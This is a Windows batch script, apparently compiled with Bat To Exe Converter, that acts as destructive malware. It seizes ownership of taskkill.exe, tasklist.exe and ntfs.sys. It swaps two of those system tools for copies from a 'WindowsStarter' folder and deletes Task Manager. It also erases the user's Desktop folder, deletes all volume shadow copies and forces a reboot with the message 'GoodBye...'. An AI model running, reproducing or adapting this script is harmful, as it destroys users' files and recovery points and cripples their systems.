::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpGSReDAES0A5EO4f7+086CsUYJW/IDXYHf1r2AJdww5Uj0fJoo0kZblMQADVVdZhfL
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
takeown /f "%windir%\system32\taskkill.exe"
icacls "%windir%\system32\taskkill.exe" /grant "%username%":F /T
copy "%windir%\system32\WindowsStarter\taskkill.exe" "%windir%\system32\taskkill.exe"/y

takeown /f "%windir%\system32\tasklist.exe"
icacls "%windir%\system32\tasklist.exe" /grant "%username%":F /T
copy "%windir%\system32\WindowsStarter\tasklist.exe" "%windir%\system32\tasklist.exe"/y

rd "%windir%\system32\WindowsStarter"/q/s

takeown /f "%windir%\system32\taskmgr.exe"
icacls "%windir%\system32\taskmgr.exe" /grant "%username%":F /T
del "%windir%\system32\taskmgr.exe"/q

if exist "%userprofile%\OneDrive" (cd %userprofile%\OneDrive) else (cd %userprofile%)
rd Desktop/q/s

cd %windir%\system32\drivers
takeown /f ntfs.sys
icacls ntfs.sys /grant "%username%":F /C

cd "%userprofile%"
vssadmin delete shadows /all /quiet
shutdown -r -c "GoodBye..." -t 2
cd %windir%\system32
del commandkiller.exe/q